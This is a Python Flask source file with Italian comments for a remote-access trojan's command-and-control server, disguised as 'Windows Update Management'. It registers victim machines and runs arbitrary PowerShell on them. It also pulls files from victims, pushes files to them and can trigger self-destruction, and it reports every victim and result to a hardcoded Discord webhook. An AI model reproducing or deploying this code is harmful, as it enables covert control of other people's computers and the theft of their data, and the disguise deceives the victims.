from flask import Flask, request, jsonify
import threading
import time
import json
import os
import hashlib
import base64
from datetime import datetime
import requests
import glob

app = Flask(__name__)

# Configurazione
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
CURRENT_VERSION = "4.0-light"

# Settings logging
MAX_LOG_FILES = 50
LOG_RETENTION_HOURS = 24

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.device_to_client = {}
        self.commands_queue = {}
        self.lock = threading.Lock()
        self.client_counter = 1000
    
    def get_or_create_client(self, device_id, client_data):
        with self.lock:
            # Client esistente
            if device_id in self.device_to_client:
                client_id = self.device_to_client[device_id]
                
                if client_id in self.clients:
                    self.clients[client_id].update(client_data)
                    self.clients[client_id]["last_seen"] = datetime.now()
                else:
                    self.clients[client_id] = {
                        **client_data,
                        "last_seen": datetime.now(),
                        "device_id": device_id
                    }
                
                return client_id
            
            # Nuovo client
            else:
                client_id = f"C{self.client_counter}"
                self.client_counter += 1
                
                self.clients[client_id] = {
                    **client_data,
                    "first_seen": datetime.now(),
                    "last_seen": datetime.now(),
                    "device_id": device_id
                }
                
                self.device_to_client[device_id] = client_id
                
                # Notifica Discord
                send_to_discord(
                    f"🆕 **Nuovo Client** {client_id}\n"
                    f"**Host:** {client_data.get('hostname', 'Unknown')}\n"
                    f"**User:** {client_data.get('username', 'Unknown')}"
                )
                
                return client_id
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                device_id = self.clients[client_id].get('device_id')
                if device_id in self.device_to_client:
                    del self.device_to_client[device_id]
                del self.clients[client_id]
            
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def list_clients(self):
        with self.lock:
            result = {}
            for cid, info in self.clients.items():
                result[cid] = {
                    "hostname": info.get("hostname", "Unknown"),
                    "username": info.get("username", "Unknown"),
                    "os": info.get("os", "Unknown"),
                    "device_id": info.get("device_id", "Unknown"),
                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
                    "active_users": info.get("active_users", [])
                }
            return result
    
    def has_command(self, client_id):
        """Check if client has pending commands"""
        with self.lock:
            return client_id in self.commands_queue and bool(self.commands_queue[client_id])

client_manager = ClientManager()

def send_to_discord(message):
    """Invia a Discord - SEMPRE ATTIVO"""
    if not DISCORD_WEBHOOK:
        return
    
    try:
        payload = {"content": f"**[SERVER]** {message[:1500]}"}
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

def save_result(data):
    """Salva risultato con rotazione automatica"""
    try:
        # Crea directory se non esiste
        os.makedirs("results", exist_ok=True)
        
        # Salva file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        client_id = data.get('client_id', 'unknown')
        filename = f"results/result_{client_id}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        # Auto-cleanup
        cleanup_old_files()
        
    except Exception as e:
        send_to_discord(f"❌ Errore salvataggio: {str(e)[:200]}")

def cleanup_old_files():
    """Cancella file vecchi >24h e mantiene max 50 file"""
    try:
        cutoff = time.time() - (LOG_RETENTION_HOURS * 3600)
        
        # Results files
        results_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime)
        
        # Cancella vecchi
        for f in results_files:
            if os.path.getmtime(f) < cutoff:
                os.remove(f)
        
        # Mantieni max 50 file
        if len(results_files) > MAX_LOG_FILES:
            for f in results_files[:-MAX_LOG_FILES]:
                try:
                    os.remove(f)
                except:
                    pass
                    
    except Exception as e:
        print(f"Cleanup error: {e}")

# ============================================
# 🏠 PAGINE WEB
# ============================================

@app.route('/')
def home():
    clients = client_manager.list_clients()
    return f"""
    <h1>Windows Update Management v{CURRENT_VERSION}</h1>
    <p>Client attivi: {len(clients)}</p>
    <p><a href="/admin">Admin Panel</a></p>
    """

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    
    # Genera opzioni client
    clients_options = ""
    for client_id, info in clients.items():
        display = f"{client_id} - {info['hostname']} ({info['username']})"
        clients_options += f'<option value="{client_id}">{display}</option>'
    
    # Genera tabella client
    clients_rows = ""
    for client_id, info in clients.items():
        last_seen = info['last_seen']
        if 'T' in last_seen:
            last_seen = last_seen.split('T')[0]
        
        # Badge utenti attivi
        active_users = info.get('active_users', [])
        user_badge = ""
        if active_users:
            user_count = len(active_users)
            user_badge = f' <span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">👤{user_count}</span>'
        
        # Tooltip lista utenti
        users_list = ", ".join(active_users) if active_users else "Nessun utente attivo"
        user_tooltip = f' title="Utenti attivi: {users_list}"' if active_users else ""
        
        clients_rows += f"""
        <tr{user_tooltip}>
            <td>{client_id}{user_badge}</td>
            <td>{info['hostname']}</td>
            <td>{info['username']}</td>
            <td>{info['os']}</td>
            <td>{last_seen}</td>
            <td>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{client_id}">
                    <input type="hidden" name="command" value="get_info">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
                </form>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{client_id}">
                    <input type="hidden" name="command" value="self_destruct">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
                </form>
                <form action="/api/remove_client" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{client_id}">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #6c757d;">🗑️</button>
                </form>
            </td>
        </tr>
        """
    
    if not clients_rows:
        clients_rows = '<tr><td colspan="6">Nessun client connesso</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Update Admin Panel</title>
        <style>
            body {{ font-family: Arial; margin: 20px; }}
            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ccc; }}
            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }}
            button:hover {{ background: #0056b3; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; }}
            th {{ background: #f2f2f2; }}
            .user-badge {{ background: #4CAF50; color: white; padding: 2px 6px; border-radius: 10px; font-size: 12px; }}
            .global-config {{ background: #e8f4fc; padding: 15px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #b3d9ff; }}
        </style>
    </head>
    <body>
        <h2>Windows Update Management Panel</h2>
        
        <!-- 👥 CONFIGURAZIONE GLOBALE UTENTI -->
        <div class="global-config">
            <h3 style="margin-top: 0;">🎯 Configurazione Target Utente</h3>
            <p>Seleziona l'utente target per tutti i comandi successivi:</p>
            
            <select id="globalUserTarget" style="padding: 8px; min-width: 200px;">
                <option value="SYSTEM">SYSTEM (Tutti gli utenti - Default)</option>
                <!-- Le opzioni verranno populate da JavaScript -->
            </select>
            
            <button onclick="applyGlobalUser()" style="padding: 8px 15px; margin-left: 10px;">
                Applica a Tutti i Form
            </button>
            
            <div id="globalUserStatus" style="margin-top: 10px; font-size: 14px; color: #666;">
                Stato: <strong>SYSTEM (tutti gli utenti)</strong>
            </div>
            
            <script>
            // Raccogli tutti gli utenti unici da tutti i client
            function collectAllUsers() {{
                const allUsers = new Set(['SYSTEM']);
                // Itera su tutte le righe della tabella
                document.querySelectorAll('tr[title*="Utenti attivi:"]').forEach(row => {{
                    const title = row.getAttribute('title');
                    if (title) {{
                        const usersStr = title.replace('Utenti attivi: ', '');
                        if (usersStr !== 'Nessun utente attivo') {{
                            usersStr.split(', ').forEach(user => {{
                                if (user.trim()) allUsers.add(user.trim());
                            }});
                        }}
                    }}
                }});
                return Array.from(allUsers).sort();
            }}
            
            // Popola il dropdown
            function populateUserDropdown() {{
                const select = document.getElementById('globalUserTarget');
                const users = collectAllUsers();
                
                // Pulisci opzioni eccetto SYSTEM
                while (select.options.length > 1) {{
                    select.remove(1);
                }}
                
                // Aggiungi utenti (escludi SYSTEM già presente)
                users.forEach(user => {{
                    if (user !== 'SYSTEM') {{
                        const option = document.createElement('option');
                        option.value = user;
                        option.textContent = user;
                        select.appendChild(option);
                    }}
                }});
            }}
            
            // Applica selezione a tutti i form
            function applyGlobalUser() {{
                const targetUser = document.getElementById('globalUserTarget').value;
                
                // Aggiorna tutti i campi hidden target_user
                document.querySelectorAll('input[name="target_user"]').forEach(input => {{
                    input.value = targetUser;
                }});
                
                // Feedback visivo
                document.getElementById('globalUserStatus').innerHTML = 
                    `Stato: <strong>${{targetUser}} (${{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
                
                // Salva per la sessione
                sessionStorage.setItem('globalTargetUser', targetUser);
                
                alert(`✅ Tutti i prossimi comandi saranno inviati a: ${{targetUser}}`);
            }}
            
            // Al caricamento
            document.addEventListener('DOMContentLoaded', function() {{
                populateUserDropdown();
                
                // Ripristina selezione salvata
                const saved = sessionStorage.getItem('globalTargetUser');
                if (saved) {{
                    document.getElementById('globalUserTarget').value = saved;
                    applyGlobalUser();
                }}
            }});
            </script>
        </div>
        
        <div class="section">
            <h3>📋 Comandi Predefiniti</h3>
            <form action="/api/send_command" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Comando:</label><br>
                <select name="command" style="width: 100%; padding: 5px;">
                    <option value="systeminfo">System Information</option>
                    <option value="list_files">List Files</option>
                    <option value="active_users">Active Users</option>
                    <option value="get_info">Client Info</option>
                    <option value="self_destruct">💣 Self Destruct</option>
                </select><br><br>
                
                <button type="submit">Invia Comando</button>
            </form>
        </div>
        
        <div class="section">
            <h3>⚡ PowerShell Live</h3>
            <form action="/api/send_powershell" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Comando:</label><br>
                <textarea name="command" rows="3" style="width: 100%;" placeholder="Get-Process"></textarea><br><br>
                
                <button type="submit">Esegui PowerShell</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📥 Download File</h3>
            <form action="/api/request_download" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Percorso file:</label><br>
                <input type="text" name="filepath" style="width: 100%; padding: 5px;" 
                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt  oppure  C:\\Windows\\System32\\..."><br><br>
                
                <button type="submit">Richiedi Download</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📤 Upload File</h3>
            <form action="/api/prepare_upload" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>File sul server:</label><br>
                <input type="text" name="server_path" style="width: 100%; padding: 5px;" placeholder="uploads/file.txt"><br><br>
                
                <label>Destinazione client:</label><br>
                <input type="text" name="client_path" style="width: 100%; padding: 5px;" 
                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt"><br><br>
                
                <button type="submit">Prepara Upload</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📊 Client Attivi ({len(clients)})</h3>
            <table>
                <tr>
                    <th>ID</th>
                    <th>Hostname</th>
                    <th>User</th>
                    <th>OS</th>
                    <th>Ultimo visto</th>
                    <th>Azioni</th>
                </tr>
                {clients_rows}
            </table>
        </div>
        
        <p><a href="/">Home</a></p>
    </body>
    </html>
    '''

# ============================================
# 🔄 API ENDPOINTS
# ============================================

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        data = request.json
        
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "device_id required"}), 400
        
        device_id = data['device_id']
        client_id = client_manager.get_or_create_client(device_id, data)
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/heartbeat', methods=['GET'])
def heartbeat():
    try:
        client_id = request.args.get('client_id')
        device_id = request.args.get('device_id')
        
        if not client_id or not device_id:
            return jsonify({"status": "error", "message": "Missing params"}), 400
        
        # Verifica client
        with client_manager.lock:
            if client_id not in client_manager.clients:
                return jsonify({"status": "reregister", "message": "Client not found"}), 404
        
        # Controlla comandi
        command_exists = client_manager.has_command(client_id)
        
        if command_exists:
            return jsonify({"status": "command_available", "message": "Command waiting"})
        else:
            # Aggiorna last_seen
            with client_manager.lock:
                if client_id in client_manager.clients:
                    client_manager.clients[client_id]["last_seen"] = datetime.now()
            
            return jsonify({"status": "ok", "message": "Heartbeat received"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/remove_client', methods=['POST'])
def remove_client_endpoint():
    """Rimuove client manualmente dal pannello"""
    try:
        client_id = request.form.get('client_id')
        
        if not client_id:
            return "Errore: client_id mancante", 400
        
        # Rimuovi client
        client_manager.remove_client(client_id)
        
        # Notifica Discord
        send_to_discord(f"🗑️ Client {client_id} rimosso manualmente dal pannello")
        
        return f'''
        <h3>Client Rimosso!</h3>
        <p>Client {client_id} è stato rimosso dal sistema.</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/get_command', methods=['GET'])
def get_command():
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        command = client_manager.get_command(client_id)
        
        if command:
            send_to_discord(f"📤 Invio comando a {client_id}: {command[:100]}")
            return jsonify({"status": "success", "command": command})
        else:
            return jsonify({"status": "no_command", "message": "No commands"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        client_id = data.get('client_id')
        command = data.get('command', 'unknown')
        results = data.get('results', {})
        
        # Salva su file (con rotazione)
        save_result(data)
        
        # Log su Discord
        result_preview = str(results)[:500]
        send_to_discord(f"📊 Risultati da {client_id}\nComando: {command}\nRisultato: {result_preview}")
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        client_id = request.form.get('client_id')
        command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not command:
            return "Errore: parametri mancanti", 400
        
        # Se target_user specificato, modifica comando
        final_command = command
        if target_user != "SYSTEM":
            # Aggiungi prefisso per identificare utente target
            final_command = f"user_{target_user}:{command}"
        
        client_manager.add_command(client_id, final_command)
        send_to_discord(f"🌐 Comando '{command}' per {client_id}" + 
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else ""))
        
        return f'''
        <h3>Comando Inviato!</h3>
        <p>Client: {client_id}</p>
        <p>Comando: {command}</p>
        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/send_powershell', methods=['POST'])
def send_powershell():
    try:
        client_id = request.form.get('client_id')
        ps_command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not ps_command:
            return "Errore: parametri mancanti", 400
        
        # Aggiungi info utente al comando
        final_command = f"powershell_live:{ps_command}"
        if target_user != "SYSTEM":
            final_command = f"user_{target_user}:powershell_live:{ps_command}"
        
        client_manager.add_command(client_id, final_command)
        
        send_to_discord(f"⚡ PowerShell per {client_id}" + 
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
                       f": {ps_command[:100]}")
        
        return f'''
        <h3>PowerShell Inviato!</h3>
        <p>Client: {client_id}</p>
        <p>Comando: {ps_command}</p>
        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/request_download', methods=['POST'])
def request_download():
    try:
        client_id = request.form.get('client_id')
        filepath = request.form.get('filepath')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not filepath:
            return "Errore: parametri mancanti", 400
        
        # Sostituisci {user} nel path se target_user specificato
        final_filepath = filepath
        if target_user != "SYSTEM" and "{user}" in filepath:
            final_filepath = filepath.replace("{user}", target_user)
        
        command = f"download_file:{final_filepath}"
        if target_user != "SYSTEM":
            command = f"user_{target_user}:{command}"
        
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"📥 Download richiesto da {client_id}" + 
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
                       f": {final_filepath}")
        
        return f'''
        <h3>Download Richiesto!</h3>
        <p>Client: {client_id}</p>
        <p>File: {final_filepath}</p>
        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/prepare_upload', methods=['POST'])
def prepare_upload():
    try:
        client_id = request.form.get('client_id')
        server_path = request.form.get('server_path')
        client_path = request.form.get('client_path')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not all([client_id, server_path, client_path]):
            return "Errore: parametri mancanti", 400
        
        # Sostituisci {user} nel path destinazione
        final_client_path = client_path
        if target_user != "SYSTEM" and "{user}" in client_path:
            final_client_path = client_path.replace("{user}", target_user)
        
        # Leggi file
        if not os.path.exists(server_path):
            return f"Errore: file non trovato", 404
        
        with open(server_path, 'rb') as f:
            content = f.read()
        
        base64_content = base64.b64encode(content).decode('utf-8')
        
        command = f"upload_file|{final_client_path}|{base64_content}"
        if target_user != "SYSTEM":
            command = f"user_{target_user}:{command}"
        
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"📤 Upload a {client_id}" + 
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
                       f": {os.path.basename(server_path)} → {final_client_path}")
        
        return f'''
        <h3>Upload Preparato!</h3>
        <p>Client: {client_id}</p>
        <p>File: {os.path.basename(server_path)}</p>
        <p>Destinazione: {final_client_path}</p>
        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/clients', methods=['GET'])
def list_clients_api():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "count": len(clients),
        "clients": clients
    })

# ============================================
# 🏁 AVVIO SERVER
# ============================================
if __name__ == '__main__':
    # Crea directory
    os.makedirs("results", exist_ok=True)
    os.makedirs("uploads", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    
    # Thread cleanup
    def cleanup_loop():
        while True:
            time.sleep(3600)  # Ogni ora
            try:
                cleanup_old_files()
            except:
                pass
    
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato")
